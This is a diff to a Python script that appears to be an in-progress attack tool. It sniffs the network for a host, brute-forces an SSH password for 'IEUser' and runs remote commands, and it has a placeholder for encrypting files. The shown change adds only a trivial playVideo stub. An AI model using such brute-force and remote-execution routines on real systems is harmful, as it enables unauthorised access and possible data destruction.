@@ -1,13 +1,18 @@
 #!/usr/bin/env python3
 
-
+import os
 import paramiko #Bruteforcing SSH connection
 import time #Bruteforcing SSH connection
 from pypsexec.client import Client #Sending remote commands
 
-#play video
 
+    
 #def encrypt file
+
+
+#play video
+def playVideo():
+    os.system("cd C:\\Users\\IEUser\\Downloads")
 
 # sniff network 
 def sniffNetwork():
@@ -44,6 +49,7 @@ def remoteExecute(ipAddress, user, password):
 
 def main():
     user= "IEUser"
+    playVideo()
     ipAddress= sniffNetwork()
     print(ipAddress)
     password=bruteForce(user,ipAddress)
